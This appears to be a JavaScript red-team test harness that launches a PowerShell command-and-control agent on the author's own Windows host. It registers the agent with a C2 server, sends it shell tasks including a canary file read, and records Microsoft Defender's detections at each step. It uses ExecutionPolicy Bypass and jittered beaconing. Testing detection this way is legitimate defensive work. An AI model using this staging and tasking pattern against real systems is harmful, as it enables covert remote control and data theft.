// breach-p3.mjs — breach test Phase 3: VARVEL payload lifecycle vs Jack's REAL Defender,
// every step detoracle-graded. Runs ON Jack's host with his authorization (the simulation
// of "an exploit landed the payload"). Steps: write -> launch -> C2 operate -> canary read.
// Verdicts come from detoracle's own primitives; cleanup at the end. One-shot, re-runnable.
import { spawn, execFile } from 'node:child_process';
import { copyFileSync, existsSync, mkdirSync, rmSync } from 'node:fs';
import { pathToFileURL } from 'node:url';

const API = 'http://127.0.0.1:8971';
const CHANNEL = 'http://192.168.50.1:49561';
const SRC = 'C:/Users/Jack/Downloads/enclave/varvel/agents/varvel-agent.ps1';
const BOX = 'C:/Users/Jack/Downloads/breachtest-box';
const { buildSnapshotCommand, parseSnapshot, classify } = await import(pathToFileURL('C:/Users/Jack/Downloads/enclave/varvel/tools/detoracle.mjs').href);

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const j = async (path, body) => { const r = await fetch(API + path, body ? { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) } : undefined); return r.json(); };
const snap = () => new Promise((res) => {
  execFile('powershell', ['-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', 'C:/Users/Jack/Downloads/enclave/scripts/detor-snap.ps1'], { windowsHide: true }, (e, stdout) => res(parseSnapshot(stdout)));
});

const report = { steps: {}, notes: [] };
console.log('[0] baseline snapshot...');
const s0 = await snap();
console.log('    S0:', JSON.stringify(s0));

console.log('[1] WRITE: staging the payload to ' + BOX);
mkdirSync(BOX, { recursive: true });
copyFileSync(SRC, BOX + '/varvel-agent.ps1');
await sleep(8000);
const s1 = await snap();
const fileAlive = existsSync(BOX + '/varvel-agent.ps1');
report.steps.write = { ...classify(s0, s1, { probeAlive: fileAlive }), filePresent: fileAlive };
console.log('    write verdict:', JSON.stringify(report.steps.write));

console.log('[2] LAUNCH: register identity + start the agent (C2 to ' + CHANNEL + ')');
const reg = await j('/api/channel/agent', { action: 'register', label: 'host-payload' });
console.log('    identity:', reg.agentId);
const agent = spawn('powershell', ['-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', BOX + '/varvel-agent.ps1',
  '-Url', CHANNEL, '-AgentId', reg.agentId, '-Token', reg.token, '-MaxLoops', '0', '-Interval', '900', '-Jitter', '200', '-Sandbox', BOX],
  { windowsHide: true, stdio: 'ignore' });
await sleep(12000);
let a = (await j('/api/channel')).agents.find((x) => x.agentId === reg.agentId) || {};
const s2 = await snap();
const launched = (a.checkins || 0) > 0 && agent.exitCode === null;
report.steps.launch = { ...classify(s1, s2, { probeAlive: launched }), checkins: a.checkins || 0, agentProcessAlive: agent.exitCode === null };
console.log('    launch verdict:', JSON.stringify(report.steps.launch));

console.log('[3] OPERATE: tasking over the governed channel (whoami, hostname, canary read)');
const tids = [];
for (const data of ['whoami', 'hostname', 'type C:\\Users\\Jack\\Desktop\\canary.txt']) {
  const t = await j('/api/channel/task', { agentId: reg.agentId, kind: 'shell', data });
  tids.push({ taskId: t.taskId, data });
}
await sleep(20000);
const { tasks } = await j('/api/channel/tasks?agent=' + reg.agentId);
const results = tids.map((t) => { const x = (tasks || []).find((y) => y.taskId === t.taskId); return { cmd: t.data, status: x && x.status, preview: x && x.resultPreview }; });
const s3 = await snap();
const operated = results.every((r) => r.status === 'resulted');
report.steps.operate = { ...classify(s2, s3, { probeAlive: operated && agent.exitCode === null }), results };
console.log('    operate verdict:', JSON.stringify(report.steps.operate));

console.log('[4] CLEANUP: kill agent + identity, remove staged files');
try { agent.kill(); } catch {}
await sleep(1500);
await j('/api/channel/agent', { action: 'kill', agentId: reg.agentId });
try { rmSync(BOX, { recursive: true, force: true }); } catch {}
const s4 = await snap();
report.cleanup = { stagedRemoved: !existsSync(BOX), finalSnapshot: s4, postCleanupDelta: classify(s3, s4) };
report.defenderContext = 'host real Defender: RTP+BehaviorMon+MAPS(cloud) all ON (defender-status.ps1)';
console.log('P3-REPORT ' + JSON.stringify(report, null, 1));
